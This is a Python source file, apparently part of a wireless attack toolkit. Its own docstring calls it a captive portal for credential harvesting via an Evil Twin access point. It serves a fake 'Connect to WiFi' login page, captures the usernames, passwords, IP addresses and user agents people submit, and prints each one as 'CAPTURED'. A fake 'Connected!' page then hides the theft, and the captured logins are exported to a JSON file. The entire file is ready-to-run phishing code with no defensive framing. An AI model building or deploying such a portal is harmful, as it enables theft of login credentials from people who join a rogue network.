"""Captive portal — HTTP server for credential harvesting via Evil Twin."""

from __future__ import annotations

import json
import os
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

from rich.console import Console

console = Console()


@dataclass
class CapturedCredential:
    timestamp: str
    source_ip: str
    username: str
    password: str
    user_agent: str = ""
    extra_fields: dict = field(default_factory=dict)


PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#f0f2f5;display:flex;justify-content:center;align-items:center;
min-height:100vh;padding:20px}
.container{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);
padding:40px;max-width:400px;width:100%}
h1{font-size:22px;color:#1a1a2e;margin-bottom:8px;text-align:center}
p{color:#666;font-size:14px;margin-bottom:24px;text-align:center}
.logo{text-align:center;margin-bottom:20px;font-size:48px}
label{display:block;font-size:13px;color:#444;margin-bottom:4px;font-weight:500}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;
font-size:15px;margin-bottom:16px;outline:none;transition:border .2s}
input:focus{border-color:#4361ee}
button{width:100%;padding:14px;background:#4361ee;color:#fff;border:none;
border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#3a56d4}
.footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="container">
<div class="logo">&#128274;</div>
<h1>Connect to WiFi</h1>
<p>Sign in to access the internet</p>
<form method="POST" action="/login">
<label for="email">Email or Username</label>
<input type="text" id="email" name="username" placeholder="Enter your email" required>
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter your password" required>
<button type="submit">Connect</button>
</form>
<div class="footer">Secured connection &bull; Terms of Service apply</div>
</div>
</body>
</html>"""

REDIRECT_HTML = """<!DOCTYPE html>
<html><head>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
<style>body{font-family:sans-serif;text-align:center;padding:60px;background:#f0f2f5}
h1{color:#2d6a4f;margin-bottom:16px}p{color:#666}</style>
</head><body>
<h1>&#10004; Connected!</h1>
<p>You are now connected to the internet. Redirecting...</p>
</body></html>"""


class CaptivePortal:
    def __init__(
        self,
        listen_ip: str = "0.0.0.0",
        port: int = 80,
        custom_html: str | None = None,
    ) -> None:
        self.listen_ip = listen_ip
        self.port = port
        self.portal_html = custom_html or PORTAL_HTML
        self.credentials: list[CapturedCredential] = []
        self._server: HTTPServer | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        portal = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(portal.portal_html.encode())

            def do_POST(self):
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length).decode()
                params = parse_qs(body)

                username = params.get("username", [""])[0]
                password = params.get("password", [""])[0]
                user_agent = self.headers.get("User-Agent", "")

                extra = {
                    k: v[0] for k, v in params.items()
                    if k not in ("username", "password")
                }

                cred = CapturedCredential(
                    timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
                    source_ip=self.client_address[0],
                    username=username,
                    password=password,
                    user_agent=user_agent,
                    extra_fields=extra,
                )
                portal.credentials.append(cred)

                console.print(
                    f"[red bold]CAPTURED: {cred.source_ip} — "
                    f"{cred.username}:{cred.password}[/red bold]"
                )

                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(REDIRECT_HTML.encode())

            def log_message(self, format, *args):
                pass

        self._server = HTTPServer((self.listen_ip, self.port), Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

        console.print(f"[green]Captive portal active on {self.listen_ip}:{self.port}[/green]")

    def stop(self) -> list[CapturedCredential]:
        if self._server:
            self._server.shutdown()
            self._server = None
        console.print(f"[yellow]Captive portal stopped — {len(self.credentials)} credentials captured[/yellow]")
        return self.credentials

    def export(self, output_dir: str = "./reports") -> str:
        os.makedirs(output_dir, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(output_dir, f"captive_creds_{ts}.json")

        data = [
            {
                "timestamp": c.timestamp,
                "source_ip": c.source_ip,
                "username": c.username,
                "password": c.password,
                "user_agent": c.user_agent,
                "extra_fields": c.extra_fields,
            }
            for c in self.credentials
        ]

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        console.print(f"[green]Credentials exported to {path}[/green]")
        return path

    def load_custom_template(self, path: str) -> None:
        with open(path) as f:
            self.portal_html = f.read()
        console.print(f"[dim]Custom portal template loaded from {path}[/dim]")
